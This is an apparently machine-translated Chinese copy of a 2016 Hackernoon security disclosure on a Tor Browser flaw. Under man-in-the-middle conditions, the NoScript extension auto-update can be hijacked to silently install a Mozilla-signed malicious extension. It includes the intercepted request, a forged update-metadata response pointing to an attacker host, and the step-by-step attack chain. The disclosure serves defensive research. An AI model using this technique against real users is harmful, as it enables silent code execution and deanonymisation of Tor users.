<html>
<head>
<title/>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1/>
<blockquote>原文：<a href="https://medium.com/hackernoon/tor-browser-exposed-anti-privacy-implantation-at-mass-scale-bd68e9eb1e95?source=collection_archive---------0-----------------------#2016-09-13">https://medium.com/hackernoon/tor-browser-exposed-anti-privacy-implantation-at-mass-scale-bd68e9eb1e95?source=collection_archive---------0-----------------------#2016-09-13</a></blockquote><div><div class="ef hi hj hk hl hm"/><div class="hn ho hp hq hr"><p id="3443" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">Tor浏览器曝光:大规模反隐私植入</p><figure class="is it iu iv fq iw fe ff paragraph-image"><div role="button" tabindex="0" class="ix iy di iz bf ja"><div class="fe ff ir"><img src="../Images/50e52346b640944170302067838c6785.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ps0IyvG6wRBO6kmXhSv-oQ.jpeg"/></div></div><figcaption class="jd je fg fe ff jf jg bd b be z ek">Credit: <a class="ae jh" href="https://twitter.com/Ox000000" rel="noopener ugc nofollow" target="_blank">@Ox000000</a></figcaption></figure><h1 id="62bc" class="ji jj hu bd jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf dt translated">简介:</h1><p id="b81f" class="pw-post-body-paragraph hs ht hu hv b hw kg hy hz ia kh ic id ie ki ig ih ii kj ik il im kk io ip iq hn dt translated">下面描述的漏洞链的组合允许恶意出口节点操作员或全球对手在tor浏览器的所有平台上进行静默远程代码执行攻击。这种攻击不仅限于假设的性质，有证据表明，这种攻击可能已经发生了多年。此攻击的易受攻击部署列表包括Windows、Linux和OSX的本机Tor <a class="ae jh" href="https://hackernoon.com/tagged/browser" rel="noopener ugc nofollow" target="_blank">浏览器</a>,还包括在Tails和Whonix等专用操作系统上安装的Tor浏览器。</p><p id="eba8" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated"><em class="kl">Tor浏览器生态系统的整个</em> <a class="ae jh" href="https://hackernoon.com/tagged/security" rel="noopener ugc nofollow" target="_blank"> <em class="kl">安全性</em> </a> <em class="kl">依赖于之前已经被攻破</em> <a class="ae jh" href="https://www.eff.org/deeplinks/2011/03/iranian-hackers-obtain-fraudulent-https" rel="noopener ugc nofollow" target="_blank"> <em class="kl">的单个TLS证书的完整性。</em>T13】</a></p><p id="17e3" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">在扩展更新流程方面，<a class="ae jh" href="https://dxr.mozilla.org/mozilla-central/source//toolkit/mozapps/extensions/internal/AddonUpdateChecker.jsm" rel="noopener ugc nofollow" target="_blank">似乎没有正确实施</a>通过证书锁定减轻这些类型风险的措施，并且似乎也没有提供保护。</p><p id="f907" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">当与目标机制结合使用时，此攻击可让访问特定clearnet资源的用户远程执行任意代码；例如通过被动地监视出口节点流量，以寻找去往特定清算网络资源的流量。此外，这种攻击使攻击者能够对所有Tor浏览器用户进行大规模利用，并在满足选定标准(如安装的语言包、公共IP地址、DNS缓存、存储的cookie、存储的web历史等)后进行植入。</p><p id="c88a" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">根据快速财务估算，发动这样一次攻击的成本约为10万美元，才能产生最大影响。提出更清晰的观点；考虑到在任何给定时间都有150万用户在Tor上操作，这种攻击的成本是每台被入侵的机器0.06美元。最终，一个民族国家或犯罪组织完全可以利用所有弱点和发动这种攻击所需的资源。</p><h1 id="8cbe" class="ji jj hu bd jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf dt translated">负责任的披露尝试:</h1><p id="3d2c" class="pw-post-body-paragraph hs ht hu hv b hw kg hy hz ia kh ic id ie ki ig ih ii kj ik il im kk io ip iq hn dt translated">在最初确认攻击的可行性之前，这个漏洞最初是在概念上公开描述的。对理论披露的反应被Micah Lee和Andrea Shepard(与Tor项目公司有关的个人)嘲笑为不可信。</p><h1 id="f956" class="ji jj hu bd jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf dt translated">攻击要求:</h1><p id="eca5" class="pw-post-body-paragraph hs ht hu hv b hw kg hy hz ia kh ic id ie ki ig ih ii kj ik il im kk io ip iq hn dt translated">由于addons.mozilla.org需要有效的/伪造的TLS证书，因此对此攻击设置了中等的进入门槛。这很难做到，但并非不可能。有趣的是，这个要求在2011年就已经被证明是可以实现的，因为<a class="ae jh" href="https://www.eff.org/deeplinks/2011/03/iranian-hackers-obtain-fraudulent-https" rel="noopener ugc nofollow" target="_blank">所谓的伊朗黑客</a>为addons.mozilla.org制造了一个假的TLS证书。雅各布·阿普尔鲍姆(Tor项目公司前雇员)也对针对addons.mozilla.org TLS证书的攻击<a class="ae jh" href="https://blog.torproject.org/blog/detecting-certificate-authority-compromises-and-web-browser-collusion" rel="noopener ugc nofollow" target="_blank">进行了详细分析。</a></p><blockquote class="km kn ko"><p id="5453" class="hs ht kl hv b hw hx hy hz ia ib ic id kp if ig ih kq ij ik il kr in io ip iq hn dt translated">“有人怀疑这一行动是由国家级对手采取的”——Jacob Applebaum描述TLS对addons.mozilla.org的攻击</p></blockquote><p id="01e1" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">另一个要求是，攻击者需要操作足够多的出口节点来服务Tor浏览器群体的重要部分。不幸的是，这根本不是一个困难的任务。</p><h1 id="15fa" class="ji jj hu bd jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf dt translated">审计发现:</h1><p id="103f" class="pw-post-body-paragraph hs ht hu hv b hw kg hy hz ia kh ic id ie ki ig ih ii kj ik il im kk io ip iq hn dt translated">对Tor浏览器自动更新机制进行了安全审计，以确定是否可能存在后门或远程代码执行攻击。</p><p id="239b" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">通常，安全的自动更新过程将通过使用加密签名来保护通信流和单个文件的完整性。正是在分析自动更新过程的过程中，发现了一个漏洞。</p><p id="b6d3" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">用于更新浏览器扩展的方法被认为易受中间人攻击。此外，人们发现Mozilla授权独立开发者<a class="ae jh" href="https://blog.mozilla.org/addons/2015/12/01/de-coupling-reviews-from-signing-unlisted-add-ons/" rel="noopener ugc nofollow" target="_blank">在没有审查的情况下对浏览器扩展进行加密签名。</a></p><blockquote class="km kn ko"><p id="eaac" class="hs ht kl hv b hw hx hy hz ia ib ic id kp if ig ih kq ij ik il kr in io ip iq hn dt translated">“本月早些时候【2015年11月】推出的插件签名API<a class="ae jh" href="https://blog.mozilla.org/addons/2015/11/20/signing-api-now-available/" rel="noopener ugc nofollow" target="_blank">，将允许完全自动化的签名过程”——</a><a class="ae jh" href="https://blog.mozilla.org/addons/author/kneedhammozilla-com/" rel="noopener ugc nofollow" target="_blank">Kev Needham</a>(Mozilla)</p></blockquote><p id="287f" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">为了验证攻击链的可行性，开发了自定义浏览器扩展来确定是否可以执行任意代码。这个浏览器扩展随后被提交给Mozilla进行加密签名，并立即被签名。</p><figure class="is it iu iv fq iw fe ff paragraph-image"><div class="fe ff ks"><img src="../Images/fbf41ffc49b6036f7578e36b43dc6087.png" data-original-src="https://miro.medium.com/v2/resize:fit:876/format:webp/1*_9udtUIw3OJUbVS54QP4lQ.png"/></div><figcaption class="jd je fg fe ff jf jg bd b be z ek">An Image Displaying a Mozilla Cryptographically-Signed Extension</figcaption></figure><p id="079a" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">在正常操作中，Tor浏览器扩展的自动更新过程如下所述:</p><ul class=""><li id="6f9d" class="kt ku hu hv b hw hx ia ib ie kv ii kw im kx iq ky kz la lb dt translated">更新请求至少每24小时发送一次</li><li id="a30f" class="kt ku hu hv b hw lc ia ld ie le ii lf im lg iq ky kz la lb dt translated">通过HTTPS下载更新元数据文件(一些元数据文件是加密签名的，另一些不是)</li><li id="7367" class="kt ku hu hv b hw lc ia ld ie le ii lf im lg iq ky kz la lb dt translated">扩展更新从addons.mozilla.org下载，并使用更新元数据文件和Mozilla根签名证书进行验证。</li><li id="9554" class="kt ku hu hv b hw lc ia ld ie le ii lf im lg iq ky kz la lb dt translated">如果下载的文件与早期的元数据文件相匹配，并且进行了加密签名，则扩展会自动更新，无需用户交互。</li></ul><h1 id="199c" class="ji jj hu bd jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf dt translated">其他审计说明:</h1><p id="7355" class="pw-post-body-paragraph hs ht hu hv b hw kg hy hz ia kh ic id ie ki ig ih ii kj ik il im kk io ip iq hn dt translated">尝试在审计期间最大化代码覆盖率。Tor浏览器中有两种通用的自动更新方法，这两种方法都经过了漏洞检查。</p><p id="ea9b" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">另一种自动更新方法更新实际的浏览器可执行文件和相关文件，但完全受一般公众无法获得的加密签名保护。我们的分析表明，这种方法不容易受到中间人攻击。</p><h1 id="e09e" class="ji jj hu bd jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf dt translated">大规模的反隐私植入:</h1><p id="1ce5" class="pw-post-body-paragraph hs ht hu hv b hw kg hy hz ia kh ic id ie ki ig ih ii kj ik il im kk io ip iq hn dt translated">从高层次来看，攻击路径可以描述如下:</p><ul class=""><li id="423c" class="kt ku hu hv b hw hx ia ib ie kv ii kw im kx iq ky kz la lb dt translated">攻击者获得addons.mozilla.org TLS证书的监护权(首选通配符)</li><li id="d155" class="kt ku hu hv b hw lc ia ld ie le ii lf im lg iq ky kz la lb dt translated">攻击者开始部署恶意出口节点</li><li id="bf2a" class="kt ku hu hv b hw lc ia ld ie le ii lf im lg iq ky kz la lb dt translated">攻击者拦截addons.mozilla.org的NoScript扩展更新流量</li><li id="17a9" class="kt ku hu hv b hw lc ia ld ie le ii lf im lg iq ky kz la lb dt translated">攻击者向发出请求的Tor浏览器返回NoScript的恶意更新元数据文件</li><li id="a92c" class="kt ku hu hv b hw lc ia ld ie le ii lf im lg iq ky kz la lb dt translated">恶意扩展有效负载被下载，然后在没有用户交互的情况下静默安装</li><li id="eb98" class="kt ku hu hv b hw lc ia ld ie le ii lf im lg iq ky kz la lb dt translated">此时，就可以远程执行代码了</li><li id="c96f" class="kt ku hu hv b hw lc ia ld ie le ii lf im lg iq ky kz la lb dt translated">攻击者可以使用额外的阶段在机器上进一步植入额外的软件或掩盖任何利用的迹象</li></ul><p id="97a0" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">通过使用Burp Suite和Tor浏览器的自定义编译版本可以演示这种攻击，该版本包含针对透明中间人攻击的硬编码根证书颁发机构。</p><p id="4a0a" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated"><strong class="hv lh"> NoScript元数据更新流程:</strong></p><p id="1a0f" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">Tor浏览器发出接收更新元数据文件的初始请求。</p><pre class="is it iu iv fq li lj lk ll aw lm dt"><span id="c8b5" class="ln jj hu lj b fv lo lp l lq lr">GET /update/VersionCheck.php?reqVersion=2&amp;id={73a6fe31-595d-460b-a920-fcc0f8843232}<strong class="lj lh"><em class="kl">[SHORTENED]</em></strong> HTTP/1.1<br/>Host: versioncheck.addons.mozilla.org<br/>...</span></pre><p id="9882" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">恶意退出节点在修改版本、更新链接和更新哈希字段后返回以下数据:</p><pre class="is it iu iv fq li lj lk ll aw lm dt"><span id="60ee" class="ln jj hu lj b fv lo lp l lq lr">HTTP/1.1 200 OK<br/>...</span><span id="c1a5" class="ln jj hu lj b fv ls lp l lq lr">&lt;RDF:Description about="urn:mozilla:extension:{73a6fe31-595d-460b-a920-fcc0f8843232}:2.9.0.14"&gt;<br/>        <strong class="lj lh"><em class="kl">&lt;em:version&gt;2.9.0.1337&lt;/em:version&gt;</em></strong><br/>        &lt;em:targetApplication&gt;<br/>            &lt;RDF:Description&gt;<br/>                &lt;em:id&gt;{ec8030f7-c20a-464f-9b0e-13a3a9e97384}&lt;/em:id&gt;<br/>                &lt;em:minVersion&gt;13.0&lt;/em:minVersion&gt;<br/>                &lt;em:maxVersion&gt;*&lt;/em:maxVersion&gt;<br/>                <strong class="lj lh"><em class="kl">&lt;em:updateLink&gt;https://hackedbynsalol.gov/hackedbynsalol-0.0.5-fx.xpi&lt;/em:updateLink&gt;</em></strong><br/>                &lt;em:updateInfoURL&gt;<!-- -->https://addons.mozilla.org/versions/updateInfo/1910123/%APP_LOCALE%/<!-- -->&lt;/em:updateInfoURL&gt;<br/>                <strong class="lj lh"><em class="kl">&lt;em:updateHash&gt;sha256:6e281b84fc944c5b7f2c1697ed9ab855682b52a95e2189f0102acba941533a9b&lt;/em:updateHash&gt;</em></strong><br/>            &lt;/RDF:Description&gt;<br/>        &lt;/em:targetApplication&gt;<br/>    &lt;/RDF:Description&gt;<br/>&lt;/RDF:RDF&gt;</span></pre><p id="6373" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">然后，Tor浏览器发送一个GET请求，请求更新后的浏览器扩展文件，并在验证其加密签名后静默安装。</p><pre class="is it iu iv fq li lj lk ll aw lm dt"><span id="dad6" class="ln jj hu lj b fv lo lp l lq lr">GET /hackedbynsalol-0.0.5-fx.xpi HTTP/1.1<br/>Host: hackedbynsalol.gov<br/>User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0<br/>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>Accept-Language: en-US,en;q=0.5<br/>Accept-Encoding: gzip, deflate<br/>Moz-XPI-Update: 1<br/>Connection: close</span></pre><p id="f950" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">由于Mozilla已对浏览器扩展进行了有效签名，因此此攻击就成功了，并可远程执行代码。</p><figure class="is it iu iv fq iw fe ff paragraph-image"><div role="button" tabindex="0" class="ix iy di iz bf ja"><div class="fe ff lt"><img src="../Images/69e3782ad8ef8266138075d01e605fd2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lb7iGdpNfeZgJMAbbUFcfw.png"/></div></div></figure><h1 id="310d" class="ji jj hu bd jk jl jm jn jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf dt translated">结论</h1><p id="026f" class="pw-post-body-paragraph hs ht hu hv b hw kg hy hz ia kh ic id ie ki ig ih ii kj ik il im kk io ip iq hn dt translated">资源充足的攻击者很可能会将这种技术武器化，从而全面破坏Tor浏览器生态系统，同时保持高度的不可检测性。</p><p id="0362" class="pw-post-body-paragraph hs ht hu hv b hw hx hy hz ia ib ic id ie if ig ih ii ij ik il im in io ip iq hn dt translated">上述攻击链代表了初步工作，并被披露，以便迅速缓解发生。</p><div class="is it iu iv fq ab cb"><figure class="lu iw lv lw lx ly lz paragraph-image"><a href="http://bit.ly/HackernoonFB"><img src="../Images/50ef4044ecd4e250b5d50f368b775d38.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*0hqOaABQ7XGPT-OYNgiUBg.png"/></a></figure><figure class="lu iw lv lw lx ly lz paragraph-image"><a href="https://goo.gl/k7XYbx"><img src="../Images/979d9a46439d5aebbdcdca574e21dc81.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*Vgw1jkA6hgnvwzTsfMlnpg.png"/></a></figure><figure class="lu iw lv lw lx ly lz paragraph-image"><a href="https://goo.gl/4ofytp"><img src="../Images/2930ba6bd2c12218fdbbf7e02c8746ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:668/format:webp/1*gKBpq1ruUi0FVK2UM_I4tQ.png"/></a></figure></div><blockquote class="km kn ko"><p id="f922" class="hs ht kl hv b hw hx hy hz ia ib ic id kp if ig ih kq ij ik il kr in io ip iq hn dt translated"><a class="ae jh" href="http://bit.ly/Hackernoon" rel="noopener ugc nofollow" target="_blank">黑客中午</a>是黑客如何开始他们的下午。我们是<a class="ae jh" href="http://bit.ly/atAMIatAMI" rel="noopener ugc nofollow" target="_blank"> @AMI </a>家庭的一员。我们现在<a class="ae jh" href="http://bit.ly/hackernoonsubmission" rel="noopener ugc nofollow" target="_blank">接受投稿</a>，并乐意<a class="ae jh" href="mailto:partners@amipublications.com" rel="noopener ugc nofollow" target="_blank">讨论广告&amp;赞助</a>机会。</p><p id="708a" class="hs ht kl hv b hw hx hy hz ia ib ic id kp if ig ih kq ij ik il kr in io ip iq hn dt translated">如果你喜欢这个故事，我们推荐你阅读我们的<a class="ae jh" href="http://bit.ly/hackernoonlatestt" rel="noopener ugc nofollow" target="_blank">最新科技故事</a>和<a class="ae jh" href="https://hackernoon.com/trending" rel="noopener ugc nofollow" target="_blank">趋势科技故事</a>。直到下一次，不要把世界的现实想当然！</p></blockquote><figure class="is it iu iv fq iw fe ff paragraph-image"><a href="https://goo.gl/Ahtev1"><div class="fe ff ma"><img src="../Images/be0ca55ba73a573dce11effb2ee80d56.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*35tCjoPcvq6LbB3I6Wegqw.jpeg"/></div></a></figure><figure class="is it iu iv fq iw"><div class="bz el l di"><div class="mb mc l"/></div></figure></div></div>    
</body>
</html>